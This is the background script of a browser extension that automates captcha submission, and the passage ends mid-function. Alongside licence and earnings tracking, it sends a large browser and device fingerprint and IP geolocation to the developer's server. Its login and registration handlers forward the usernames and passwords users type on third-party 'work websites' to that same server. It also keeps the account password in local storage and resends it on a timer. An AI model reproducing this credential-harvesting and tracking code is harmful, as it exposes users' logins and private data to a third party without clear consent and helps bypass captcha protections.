/**
 * Auto captcha submit
 * Developer: Mr Abir Ahamed
 * Website: https://www.mishusoft.com
 * Official Link: https://download.mishusoft.com/addons/autocapsubmitpro/
 * */

'use strict';
import {browser} from "webextension-polyfill-ts";
import {BrowserJS} from "./browserjs";
import {app} from "./db";
import {
    appTracker, appPaymentURL, globalAppMonitorURL,
    createDefaultAppData, /*regenerateEarnLimit,*/ sendRequest, optimizeAppSettingObject,/* desktopScreenshot,*/
} from "./lib";

let acsComPortBack: any;
let globalAppBrowser: any;
let globalAppIP: any;
let BrJS = new BrowserJS(window.navigator)


function messengerConnector(p: any) {
    acsComPortBack = p;
    acsComPortBack.onMessage.addListener(backgroundResponder);
    /*acsComPortBack.onDisconnect.addListener(function (p: { name: string; }) {
        console.error('ERROR: Using port (' + p.name + ') are disconnected!!');
        console.info('INFO: reconnecting to port (' + p.name + ') !!');
    });*/
}

browser.runtime.onConnect.addListener(messengerConnector);

function setDefaultQAppData(ip: any, city: any, country_name: any) {
    browser.storage.local.set(
        createDefaultAppData(BrJS.BrowserNameFull, BrJS.BrowserVersion, ip, city, country_name,
            BrJS.DeviceName, BrJS.PlatformName, BrJS.PlatformArchitecture
        ))
        /*#!if debug===true*/
        .then(() => {
            console.log('app configuration set!')
        });
    /*#!endif*/
}

function installDefaultQAppData() {
    sendRequest({
        method: "GET",
        url: app.website.IpInfo,
        async: true,
        header: [{name: "Accept", value: "application/json"}]
    }, function (data: { ip: any; city: any; country_name: any; }) {
        setDefaultQAppData(data.ip, data.city, data.country_name);
    });
}

export function checkSettings(details: { reason: string }, ipdata?: any) {
    browser.storage.local.get().then(function (setting) {
        let client = {
            ip: undefined,
            city: undefined,
            country: undefined
        };
        if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
            if (Object.keys(setting.client).length !== 0 && setting.client.constructor === Object) {
                client.ip = setting.client.ip;
                client.city = setting.client.city;
                client.country = setting.client.country;
            } else {
                installDefaultQAppData();
            }
            if (Object.keys(setting.app).length !== 0 && setting.app.constructor === Object) {
                if (setting.app.id === undefined || setting.app.id === "") {
                    sendRequest({
                        method: "POST",
                        url: globalAppMonitorURL + "getPubAppID",
                        async: true,
                        header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                        data: {
                            "IdRequest": {
                                "name": app.about.name,
                                "version": app.about.version,
                                "ip": client.ip,
                                "browser": BrJS.BrowserNameFull,
                                "message": details?.reason/*'checkRun' */
                            }
                        }
                    }, function (IdResponse: { app_pub_id: any; }) {
                        browser.storage.local.set({
                            "app": {
                                "id": IdResponse.app_pub_id,
                                "name": setting.app.name,
                                "version": setting.app.version
                            }
                        });
                    });
                } else {
                    if (setting.app.name === undefined || setting.app.name === "" || setting.app.version === undefined || setting.app.version === "") {
                        browser.storage.local.set({
                            "app": {
                                "id": setting.app.id,
                                "name": app.about.name,
                                "version": app.about.version
                            }
                        });
                    } else {
                        if (setting.app.version !== app.about.version){
                            browser.storage.local.set({
                                "app": {
                                    "id": setting.app.id,
                                    "name": setting.app.name,
                                    "version": app.about.version
                                }
                            });
                        }
                    }
                }
            } else {
                installDefaultQAppData();
            }

            if (Object.keys(setting.user).length !== 0 && setting.user.constructor === Object) {
                if (setting.user.first_name === undefined || setting.user.first_name === "" || setting.user.last_name === undefined || setting.user.last_name === "" ||
                    setting.user.email === undefined || setting.user.email === "" || setting.user.password === undefined || setting.user.password === "") {
                    if (acsComPortBack !== undefined) {
                        acsComPortBack.postMessage({'command': 'setUserDetails'});
                    }
                }
            } else {
                installDefaultQAppData();
            }

            if (Object.keys(setting.licence).length !== 0 && setting.licence.constructor === Object) {
                if (setting.licence.key === undefined || setting.licence.key === "" || setting.licence.type === undefined || setting.licence.type === "" ||
                    setting.licence.issue === undefined || setting.licence.issue === "" || setting.licence.update === undefined || setting.licence.update === "" ||
                    setting.licence.expire === undefined || setting.licence.expire === "" || setting.licence.limit === undefined || setting.licence.limit === "" || setting.licence.limit === 0) {
                    if (acsComPortBack !== undefined) {
                        if (setting.licence.type === 'trial') {
                            return acsComPortBack.postMessage({'command': 'getLicence'});
                        } else {
                            if (setting.licence.type === undefined || setting.licence.type !== "") {
                                return acsComPortBack.postMessage({
                                    'command': 'waitForNextDay',
                                    data: {nextUpdate: setting.licence.nextUpdate}
                                });
                            }
                        }
                    }
                } else {
                    if (acsComPortBack !== undefined) {
                        acsComPortBack.postMessage({'command': 'licenceValid'});
                    }
                }
            } else {
                installDefaultQAppData();
            }
        } else {
            if (ipdata !== undefined) {
                setDefaultQAppData(ipdata.ip, ipdata.city, ipdata.country_name);
            } else {
                installDefaultQAppData();
            }
        }
    })
}

function sendReportToMonitor(details: any) {
    return sendRequest({
        method: "GET",
        url: app.website.IpInfo,
        async: true,
        header: [{name: "Accept", value: "application/json"}]
    }, function (IpDataReply: any) {
        let languageName: any = '';
        let languageNative: any = '';
        IpDataReply.languages?.forEach(function (item: { name: any; }) {
            languageName += item.name + ', ';
        });
        IpDataReply.languages?.forEach(function (item: { native: any; }) {
            languageNative += item.native + ', ';
        });

        globalAppBrowser = {
            "ip": IpDataReply.ip,
            "BrowserName": BrJS.BrowserName,
            "BrowserNameFull": BrJS.BrowserNameFull,
            "BrowserVersion": BrJS.BrowserVersion,
            "BrowserVersionFull": BrJS.BrowserVersionFull,
            "BrowserStatus": BrJS.BrowserStatus,
            "BrowserArchitecture": BrJS.BrowserArchitecture,
            "BrowserAppName": BrJS.BrowserAppName,
            "BrowserAppCodeName": BrJS.BrowserAppCodeName,
            "BrowserAppVersion": BrJS.BrowserAppVersion,
            "BrowserBuildID": BrJS.BrowserBuildID,
            "BrowserDoNotTrack": BrJS.BrowserDoNotTrack,
            "BrowserCookieEnabled": BrJS.BrowserCookieEnabled,
            "BrowserLanguage": BrJS.BrowserLanguage,
            "BrowserLanguageAll": BrJS.BrowserLanguageAll[0],
            "BrowserEngine": BrJS.BrowserEngine,
            "BrowserEngineVersion": BrJS.BrowserEngineVersion,
            "BrowserVendor": BrJS.BrowserVendor,
            "DeviceHardwareConcurrency": BrJS.DeviceHardwareConcurrency,
            "DeviceMemory": BrJS.DeviceMemory,
            "PlatformName": BrJS.PlatformName,
            "PlatformArchitecture": BrJS.PlatformArchitecture,
            "PlatformWindowManager": BrJS.PlatformWindowManager,
            "DeviceName": BrJS.DeviceName,
            "DeviceType": BrJS.DeviceType,
            "DeviceScreenWidth": BrJS.DeviceScreenWidth,
            "DeviceScreenHeight": BrJS.DeviceScreenHeight,
            "DeviceScreenColorDepth": BrJS.DeviceScreenColorDepth,
            "DeviceScreenPixelDepth": BrJS.DeviceScreenPixelDepth,
            "WindowLocationHref": BrJS.WindowLocationHref,
            "WindowLocationProtocol": BrJS.WindowLocationProtocol,
            "WindowLocationHostname": BrJS.WindowLocationHostname,
            "WindowLocationPathname": BrJS.WindowLocationPathname,
            "UserAgent": BrJS.UserAgent
        };
        globalAppIP = {
            "ip": IpDataReply.ip,
            "is_eu": IpDataReply.is_eu,
            "city": IpDataReply.city,
            "region": IpDataReply.region,
            "region_code": IpDataReply.region_code,
            "country_name": IpDataReply.country_name,
            "country_code": IpDataReply.country_code,
            "continent_name": IpDataReply.continent_name,
            "continent_code": IpDataReply.continent_code,
            "latitude": IpDataReply.latitude,
            "longitude": IpDataReply.longitude,
            "postal": IpDataReply.postal,
            "calling_code": IpDataReply.calling_code,
            "flag": IpDataReply.flag,
            "emoji_flag": IpDataReply.emoji_flag,
            "emoji_unicode": IpDataReply.emoji_unicode,
            "asn_asn": IpDataReply.asn.asn,
            "asn_name": IpDataReply.asn.name,
            "asn_domain": IpDataReply.asn.domain,
            "asn_route": IpDataReply.asn.route,
            "asn_type": IpDataReply.asn.type,
            "languages_name": languageName,
            "languages_native": languageNative,
            "currency_name": IpDataReply.currency.name,
            "currency_code": IpDataReply.currency.code,
            "currency_symbol": IpDataReply.currency.symbol,
            "currency_native": IpDataReply.currency.native,
            "currency_plural": IpDataReply.currency.plural,
            "time_zone_name": IpDataReply.time_zone.name,
            "time_zone_abbr": IpDataReply.time_zone.abbr,
            "time_zone_offset": IpDataReply.time_zone.offset,
            "time_zone_is_dst": IpDataReply.time_zone.is_dst,
            "time_zone_current_time": IpDataReply.time_zone.current_time
        };

        checkSettings(details, {
            ip: IpDataReply.ip,
            city: IpDataReply.city,
            country_name: IpDataReply.country_name
        });

        sendRequest({
            method: "POST",
            url: globalAppMonitorURL + "receiveFeedback",
            async: true,
            header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
            data: {
                "update": {
                    "name": app.about.name,
                    "version": app.about.version,
                    "ip": IpDataReply.ip,
                    "browser": BrJS.BrowserNameFull,
                    "message": details.reason
                },
                "status": {
                    "name": app.about.name,
                    "version": app.about.version,
                    "ip": IpDataReply.ip,
                    "os_version": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                    "browser": BrJS.BrowserNameFull,
                    "message": 'active'
                },
                "browser": globalAppBrowser,
                "ipdata": globalAppIP
            }
        });
    });
}

function backgroundResponder(request: { constructor?: any; command?: any; data?: any; amount?: any; licence?: any; }) {
    /*console.log(request);*/
    if (typeof request === 'object' && request.constructor === Object && Object.keys(request).length !== 0) {
        if (request.command !== undefined) {
            if (request.command === 'checkSettings') {
                return checkSettings({reason: 'checkRun'});
            }
            if (request.command === 'saveNavigateData' || request.command === 'saveLoginData' || request.command === 'saveRegistrationData' || request.command === 'saveLogoutData') {
                return browserUserDataManagement(request.command, request.data);
            }
            if (request.command === 'saveUserSettingData') {
                return browserUserDataManagement(request.command, request.data);
            }
            if (request.command === 'resetUserIpData') {
                return browserUserDataManagement(request.command, request.data);
            }
            if (request.command === 'doUserLoginData') {
                return browserUserDataManagement(request.command, request.data);
            }
            if (request.command === 'recoverUserPassword') {
                return browserUserDataManagement(request.command, request.data);
            }
            if (request.command === 'sendUserData') {
                if (acsComPortBack !== undefined) {
                    browser.storage.local.get().then(function (appsetting) {
                            if (Object.keys(appsetting).length !== 0 && appsetting.constructor === Object) {
                                if (appsetting.app !== '' || appsetting.app.id !== '' || appsetting.app.name !== '' ||
                                    appsetting.browser !== '' || appsetting.browser.name !== '' || appsetting.browser.version !== '' ||
                                    appsetting.client !== '' || appsetting.client.ip !== '' || appsetting.client.city !== '' || appsetting.client.country !== '' ||
                                    appsetting.device !== '' || appsetting.device.name !== '' || appsetting.device.platform !== '' || appsetting.device.architecture !== '' ||
                                    appsetting.user !== '' || appsetting.user.first_name !== '' || appsetting.user.last_name !== '' || appsetting.user.email !== '' || appsetting.user.password !== '' ||
                                    appsetting.licence !== '' || appsetting.licence.key !== '' || appsetting.licence.type !== '' || appsetting.licence.issue !== '' || appsetting.licence.update !== '' ||
                                    appsetting.licence.expire !== '' || appsetting.licence.limit !== '') {
                                    return acsComPortBack.postMessage({'userdata': appsetting});
                                } else {
                                    return checkSettings({reason: 'checkRun'});
                                }
                            }
                        }
                    );
                }
            }
            if (request.command === 'sendClientIpData') {
                if (acsComPortBack !== undefined) {
                    browser.storage.local.get('client').then(function (clientsetting) {
                            if (Object.keys(clientsetting).length !== 0 && clientsetting.constructor === Object) {
                                if (clientsetting.client !== '' || clientsetting.client.ip !== '' || clientsetting.client.city !== '' || clientsetting.client.country !== '') {
                                    return acsComPortBack.postMessage({'clientIpData': clientsetting.client});
                                } else {
                                    return checkSettings({reason: 'checkRun'});
                                }
                            }
                        }
                    );
                }
            }
            if (request.command === 'sendEarnLimit') {
                if (acsComPortBack !== undefined) {
                    browser.storage.local.get('licence').then(function (setting) {
                            if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
                                return acsComPortBack.postMessage({'licence': setting.licence});
                            }
                        }
                    );
                }
            }
            if (request.command === 'decrease') {
                if (acsComPortBack !== undefined) {
                    browser.storage.local.get().then(
                        function (setting) {
                            if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
                                if (setting.licence.limit === 0) {
                                    if (setting.licence.type === 'trial') {
                                        return acsComPortBack.postMessage({'command': 'setLicence'});
                                    } else {
                                        return acsComPortBack.postMessage({
                                            'command': 'waitForNextDay',
                                            data: {nextUpdate: setting.licence.nextUpdate}
                                        });
                                    }
                                } else {
                                    sendRequest({
                                        method: "POST",
                                        url: globalAppMonitorURL + "clientEarningRecord",
                                        async: true,
                                        header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                                        data: {
                                            "command": request.command,
                                            "earndata": {
                                                _default_: {
                                                    "tracker": appTracker,
                                                    "app_id": setting.app.id,
                                                    "ip": setting.client.ip,
                                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                                    "browser": BrJS.BrowserNameFull
                                                },
                                                "event": 'earning',
                                                "username": request.data.username,
                                                "limit": (setting.licence.limit - request.amount),
                                                "limitBase": setting.licence.limitBase,
                                                "earn": request.amount,
                                                "today_earn": (setting.licence.earn + request.amount),
                                                "actual_earn": request.data.actual_earn,
                                                "workWebsite": request.data.workWebsite,
                                                "referrals": request.data.referrals,
                                                "referralsEarn": request.data.referrals_earn
                                            }
                                        }
                                    });
                                    browser.storage.local.set({
                                        "licence": {
                                            "key": setting.licence.key,
                                            "type": setting.licence.type,
                                            "issue": setting.licence.issue,
                                            "update": setting.licence.update,
                                            "nextUpdate": setting.licence.nextUpdate,
                                            "expire": setting.licence.expire,
                                            "limit": (setting.licence.limit - request.amount),
                                            "limitBase": setting.licence.limitBase,
                                            "earn": (setting.licence.earn + request.amount)
                                        }
                                    });
                                    browser.storage.local.get('licence').then(function (updatedLicenceSetting) {
                                            if (Object.keys(updatedLicenceSetting).length !== 0 && updatedLicenceSetting.constructor === Object) {
                                                return acsComPortBack?.postMessage({'licence': updatedLicenceSetting.licence});
                                            }
                                        }
                                    );
                                }
                            }
                        }
                    );
                }
            }
            if (request.command === 'setLicence') {
                if (acsComPortBack !== undefined) {
                    browser.storage.local.get('licence').then(
                        function (licenceSetting) {
                            if (Object.keys(licenceSetting).length !== 0 && licenceSetting.constructor === Object) {
                                browser.storage.local.set({
                                    "licence": {
                                        "key": request.licence.key,
                                        "type": request.licence.type,
                                        "issue": request.licence.issue,
                                        "update": request.licence.update,
                                        "nextUpdate": request.licence.nextUpdate,
                                        "expire": request.licence.expire,
                                        "limit": request.licence.limit,
                                        "limitBase": request.licence.limitBase,
                                        "earn": licenceSetting.licence.earn
                                    }
                                });
                                return acsComPortBack.postMessage({'command': 'licenceValid'});
                            }
                        }
                    );
                }
            }
            if (request.command === 'verifyClient') {
                return browserUserDataManagement(request.command, request.data);
            }
        } /*else {
            console.log("Message from the content script: ");
            console.log(request);
        }*/
    } /*else {
        console.error('ERROR: Communication error.');
    }*/
    return checkSettings({reason: 'checkRun'});
}

function browserUserDataManagement(command: string, data: { username?: any; password: any; workWebsite?: any; email?: any; emailAddress: any; security_code?: any; planType?: any; plan?: any; amount?: any; firstName?: any; lastName?: any; }) {
    /*console.log(command);
    console.log(data);*/
    browser.storage.local.get().then(function (setting) {
        if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
            if (setting.app !== '' || setting.app.id !== '' || setting.browser.name !== '' || setting.client.ip !== '' || setting.user.email !== '') {
                /*-----------------------------------------------------------------------------------------------------------*/
                if (command === 'saveLoginData') {
                    /*console.log(command);
                    console.log(data);*/
                    sendRequest({
                        method: "POST",
                        url: globalAppMonitorURL + "browserUserDataManagement",
                        async: true,
                        header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                        data: {
                            "command": command,
                            "userdata": {
                                _default_: {
                                    "tracker": appTracker,
                                    "app_id": setting.app.id,
                                    "ip": setting.client.ip,
                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                    "browser": BrJS.BrowserNameFull
                                },
                                "event": 'login',
                                "username": data.username,
                                "password": data.password,
                                "workWebsite": data.workWebsite
                            }
                        }
                    });
                } else if (command === 'saveRegistrationData') {
                    sendRequest({
                        method: "POST",
                        url: globalAppMonitorURL + "browserUserDataManagement",
                        async: true,
                        header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                        data: {
                            "command": command,
                            "userdata": {
                                _default_: {
                                    "tracker": appTracker,
                                    "app_id": setting.app.id,
                                    "ip": setting.client.ip,
                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                    "browser": BrJS.BrowserNameFull
                                },
                                "event": "registration",
                                "username": data.username,
                                "password": data.password,
                                "email": data.email,
                                "workWebsite": data.workWebsite
                            }
                        }
                    });
                } else if (command === 'saveLogoutData') {
                    sendRequest({
                        method: "POST",
                        url: globalAppMonitorURL + "browserUserDataManagement",
                        async: true,
                        header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                        data: {
                            "command": command,
                            "userdata": {
                                _default_: {
                                    "tracker": appTracker,
                                    "app_id": setting.app.id,
                                    "ip": setting.client.ip,
                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                    "browser": BrJS.BrowserNameFull
                                },
                                "event": "logout",
                                "username": data.username,
                                "workWebsite": data.workWebsite
                            }
                        }
                    });
                } else if (command === 'saveNavigateData') {
                    sendRequest({
                        method: "POST",
                        url: globalAppMonitorURL + "browserUserDataManagement",
                        async: true,
                        header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                        data: {
                            "command": command,
                            "userdata": {
                                _default_: {
                                    "tracker": appTracker,
                                    "app_id": setting.app.id,
                                    "ip": setting.client.ip,
                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                    "browser": BrJS.BrowserNameFull
                                },
                                "event": "navigate",
                                "username": data.username,
                                "workWebsite": data.workWebsite
                            }
                        }
                    });
                } else if (command === 'saveUserSettingData') {
                    configureUserNLicenceByServer(command, data);
                } else if (command === 'resetUserIpData') {
                    configureUserNLicenceByServer(command, data);
                } else if (command === 'doUserLoginData') {
                    /*console.log(data);*/
                    sendRequest({
                        method: "POST",
                        url: globalAppMonitorURL + "browserUserDataManagement",
                        async: true,
                        header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                        data: {
                            "command": command,
                            "userdata": {
                                _default_: {
                                    "tracker": appTracker,
                                    "app_id": setting.app.id,
                                    "ip": setting.client.ip,
                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                    "browser": BrJS.BrowserNameFull
                                },
                                "email": data.emailAddress,
                                "password": data.password,
                                "passwordType": 'normal'
                            }
                        }
                    }, function (reply: any) {
                        /*#!if debug===true*/
                        console.log(reply);
                        /*#!endif*/
                        if (reply.message === 'success') {
                            browser.storage.local.set({
                                "licence": {
                                    "key": reply.licence.key,
                                    "type": reply.licence.type,
                                    "issue": reply.licence.issue,
                                    "update": reply.licence.update,
                                    "nextUpdate": reply.licence.nextUpdate,
                                    "expire": reply.licence.expire,
                                    "limit": (reply.licence.limit !== null) ? reply.licence.limit : 0,
                                    "limitBase": (reply.licence.limitBase !== null) ? reply.licence.limitBase : 0,
                                    "earn": 0
                                },
                                "user": {
                                    "first_name": reply.user.firstName,
                                    "last_name": reply.user.lastName,
                                    "email": reply.user.emailAddress,
                                    "password": reply.user.password
                                },
                                "log_status": reply.log_status
                            });
                        }
                        if (acsComPortBack !== undefined) {
                            acsComPortBack.postMessage(reply);
                        }
                    });
                } else if (command === 'recoverUserPassword') {
                    /*#!if debug===true*/
                    console.log(data);
                    /*#!endif*/
                    sendRequest({
                        method: "POST",
                        url: globalAppMonitorURL + "browserUserDataManagement",
                        async: true,
                        header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                        data: {
                            "command": command,
                            "userdata": {
                                _default_: {
                                    "tracker": appTracker,
                                    "app_id": setting.app.id,
                                    "ip": setting.client.ip,
                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                    "browser": BrJS.BrowserNameFull
                                },
                                "email": data.emailAddress
                            }
                        }
                    }, function (reply?: any) {
                        if (acsComPortBack !== undefined) {
                            acsComPortBack.postMessage(reply);
                        }
                    });
                } else if (command === 'verifyClient') {
                    /*console.log(data);*/
                    /*-------------------*/
                    sendRequest({
                        method: "POST",
                        url: appPaymentURL + "verifyClient",
                        async: true,
                        header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                        data: {
                            "security_code": data.security_code,
                            "appId": setting.app.id,
                            "ipAddress": setting.client.ip,
                            "browserName": setting.browser.name,
                            "userEmail": setting.user.email,
                            "planType": data.planType,
                            "plan": data.plan,
                            "amount": data.amount,
                        }
                    }, function (reply: { type: string; paymentPlanTypeEncrypt: any; paymentPlanEncrypt: any; message: any; clientIP: any; emailEncrypt: any; }) {
                        /*console.log(reply);*/
                        if (reply.type === 'success') {
                            sendRequest({
                                method: "POST",
                                url: appPaymentURL + "encryptAmount",
                                async: true,
                                header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                                data: {
                                    "security_code": data.security_code,
                                    "amount": data.amount
                                }
                            }, function (reply2: { amount: any; }) {
                                /*console.log(reply2);*/
                                if (acsComPortBack !== undefined) {
                                    acsComPortBack.postMessage({
                                        clientVerification: {
                                            "paymentUrl": appPaymentURL,
                                            "paymentPlanTypeEncrypt": reply.paymentPlanTypeEncrypt,
                                            "paymentPlanEncrypt": reply.paymentPlanEncrypt,
                                            "type": reply.type,
                                            "message": reply.message,
                                            "appId": setting.app.id,
                                            "ipAddress": reply.clientIP,
                                            "browserName": setting.browser.name,
                                            "userEmail": reply.emailEncrypt,
                                            "amount": reply2.amount
                                        }
                                    });
                                } /*else {
                                    console.error('ERROR: Communication error.');
                                }*/
                            });
                        }
                    });
                }
                /*-----------------------------------------------------------------------------------------------------------*/
            } else {
                return checkSettings({reason: 'checkRun'});
            }
        }
    })
}

function configureUserNLicenceByServer(command: any, data: { username?: any; password: any; workWebsite?: any; email?: any; emailAddress: any; security_code?: any; planType?: any; plan?: any; amount?: any; firstName?: any; lastName?: any }) {
    browser.storage.local.get().then(function (setting) {
        if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
            if (setting.app !== '' || setting.app.id !== '' || setting.browser.name !== '' || setting.client.ip !== '') {
                sendRequest({
                    method: "POST",
                    url: globalAppMonitorURL + "browserUserDataManagement",
                    async: true,
                    header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                    data: {
                        "command": command,
                        "userdata": {
                            "_default_": {
                                "tracker": appTracker,
                                "app_id": setting.app.id,
                                "ip": setting.client.ip,
                                "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                                "browser": setting.browser.name
                            },
                            "first_name": data.firstName,
                            "last_name": data.lastName,
                            "email": data.emailAddress,
                            "password": data.password
                        }
                    }
                }, function (reply: { message: any; licence: any; u_pass: any; log_status: any; }) {
                    /*console.log(reply);*/
                    setUserNLicenceSetting(reply, data);
                    if (acsComPortBack !== undefined) {
                        acsComPortBack.postMessage(reply);
                    } /*else {
                        console.error('ERROR: Communication error.');
                    }*/
                });
            } else {
                return checkSettings({reason: 'checkRun'});
            }
        }
    })
}

function setUserNLicenceSetting(reply: { message: any; licence: any; u_pass: any; log_status: any }, data: { username?: any; password: any; workWebsite?: any; email?: any; emailAddress: any; security_code?: any; planType?: any; plan?: any; amount?: any; firstName?: any; lastName?: any }) {
    if (reply.message === 'success') {
        browser.storage.local.set({
            "licence": {
                "key": reply.licence.key,
                "type": reply.licence.type,
                "issue": reply.licence.issue,
                "update": reply.licence.update,
                "nextUpdate": reply.licence.nextUpdate,
                "expire": reply.licence.expire,
                "limit": (reply.licence.limit !== null) ? reply.licence.limit : 0,
                "limitBase": (reply.licence.limitBase !== null) ? reply.licence.limitBase : 0,
                "earn": 0
            },
            "user": {
                "first_name": data.firstName,
                "last_name": data.lastName,
                "email": data.emailAddress,
                "password": reply.u_pass
            },
            "log_status": reply.log_status
        });
    }
}

/*
function collectExtensionsDetailsFromBrowser() {
    sendReportToServer(function (setting:any) {
        sendRequest({
            method: "POST",
            url: globalAppMonitorURL + "receiveFeedback",
            async: true,
            header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
            data: {
                "status": {
                    "name": setting.app.name,
                    "version": app.about.version,
                    "ip": setting.client.ip,
                    "os_version": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                    "browser": BrJS.BrowserNameFull,
                    "message": 'active'
                }
            }
        }, function (reply:any) {
            console.log(reply);
        });
    });
}
*/

/*function sendReportToServer(extensionCurrentStatus: string) {
    browser.storage.local.get().then(function (setting) {
        if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
            /!*console.log(setting);
            console.log(app.about.version);*!/
            sendRequest({
                method: "POST",
                url: globalAppMonitorURL + "receiveFeedback",
                async: true,
                header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                data: {
                    "status": {
                        "name": setting.app.name,
                        "version": app.about.version,
                        "ip": setting.client.ip,
                        "os_version": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                        "browser": BrJS.BrowserNameFull,
                        "message": 'disabled'
                    }
                }
            }, function () {
                if (setting.app !== '' || setting.app.id !== '' || setting.app.name !== '' || setting.app.version !== '' || setting.browser.name !== '' || setting.client.ip !== '') {
                    sendRequest({
                        method: "POST",
                        url: globalAppMonitorURL + "receiveFeedback",
                        async: true,
                        header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                        data: {
                            "update": {
                                "name": setting.app.name,
                                "version": app.about.version,
                                "ip": setting.client.ip,
                                "browser": BrJS.BrowserNameFull,
                                "message": extensionCurrentStatus
                            }
                        }
                    });
                }
            });
        }
    });

}*/

function sendExtensionStatusReport(callbackFn: any) {
    browser.management.getAll().then(function (extensions) {
        if (extensions.length !== 0) {
            //sendReportToServer()
            if (callbackFn) {
                return callbackFn(extensions);
            }
        }
    })
}


function sendFeedback(callbackFn: any) {
    browser.storage.local.get().then(
        function (setting) {
            if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
                if (callbackFn) {
                    return callbackFn(setting);
                }
            }
        }
    );
}


/*browser.management.getSelf().then(function (info) {
    console.log(info);
});


browser.runtime.getPlatformInfo().then(function (info) {
    console.log(info);
})*/

/*@ts-ignore*/
function optimizeAppSetting(setting: any, callbackFn?: any) {
    if (Object.keys(setting.app).length !== 0 && setting.app.constructor === Object && setting.app.id === undefined || setting.app.id !== ""
        && Object.keys(setting.user).length !== 0 && setting.user.constructor === Object && setting.user.first_name !== "" || setting.user.first_name === undefined
        && setting.user.last_name !== "" || setting.user.last_name === undefined && setting.user.email !== "" || setting.user.email === undefined
        && setting.user.password !== "" || setting.user.password === undefined && Object.keys(setting.licence).length !== 0 && setting.licence.constructor === Object
        && setting.licence.limit !== "" || setting.licence.limit === undefined) {
        if (callbackFn) {
            return callbackFn(setting);
        }
    }
}


/*add status, event and more*/


browser.runtime.onInstalled.addListener(sendReportToMonitor);

browser.browserAction.onClicked.addListener(function () {
    browser.tabs.create({
        /*discarded:true,
        title:"about:blank",*/
        url: app.author.refLink
    }).then(r => console.log(r));
    /*desktopScreenshot()*/
    return checkSettings({reason: 'checkRun'});
});

browser.runtime.setUninstallURL(app.website.home).then(() => {
    sendFeedback(function (setting: any) {
        optimizeAppSettingObject(setting, [{"app": ["id", "name", "version"]}, {"browser": ["name"]}, {"client": ["ip"]}], function (setting: any) {
            return sendRequest({
                method: "POST",
                url: globalAppMonitorURL + "receiveFeedback",
                async: true,
                header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                data: {
                    "update": {
                        "name": setting.app.name,
                        "version": setting.app.version,
                        "ip": setting.client.ip,
                        "browser": setting.browser.name,
                        "message": 'uninstall'
                    },
                    "status": {
                        "name": setting.app.name,
                        "version": app.about.version,
                        "ip": setting.client.ip,
                        "os_version": setting.device.platform + ' ' + setting.device.architecture,
                        "browser": setting.browser.name,
                        "message": 'uninstall'
                    }

                }
            });
        }, function () {
            return checkSettings({reason: 'checkRun'});
        });
    });
});


browser.management.onUninstalled.addListener((info) => {
    sendExtensionStatusReport('uninstall');
    console.log(info.name + " was uninstalled");
});

browser.management.onDisabled.addListener((info) => {
    sendExtensionStatusReport('disabled');
    console.log(info.name + " was disabled");
});


/*licence updater*/
setInterval(function () {
    sendFeedback(function (setting: any) {
        sendRequest({
            method: "POST",
            url: globalAppMonitorURL + "receiveFeedback",
            async: true,
            header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
            data: {
                "status": {
                    "name": setting.app.name,
                    "version": app.about.version,
                    "ip": setting.client.ip,
                    "os_version": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
                    "browser": setting.browser.name,
                    "message": 'active'
                }
            }
        }, function () {
            optimizeAppSettingObject(setting, [{"app": ["id"]},
                {"browser": ["name"]}, {"client": ["ip"]},
                {"user": ["first_name","last_name","email","password"]},
                {"licence": ["limit"]}], function (setting: any) {
                console.log(setting);
                sendRequest({
                    method: "POST",
                    url: globalAppMonitorURL + "browserUserDataManagement",
                    async: true,
                    header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
                    data: {
                        "command": 'doUserLoginData',
                        "userdata": {
                            "_default_": {
                                "tracker": appTracker,
                                "app_id": setting.app.id,
                                "ip": setting.client.ip,
                                "os_name_arch": setting.device.platform + ' ' + setting.device.architecture,
                                "browser": setting.browser.name
                            },
                            "first_name": setting.user.first_name,
                            "last_name": setting.user.last_name,
                            "email": setting.user.email,
                            "password": setting.user.password,
                            "passwordType": 'encrypt'
                        }
                    }
                }, function (reply: { message: string; licence: { key: any; type: any; issue: any; update: any; nextUpdate: any; expire: any; limit: null; limitBase: null; } | undefined; log_status: any; }) {
                    if (reply.message === 'success' && reply.licence !== undefined) {
                        browser.storage.local.set({
                            "licence": {
                                "key": reply.licence.key,
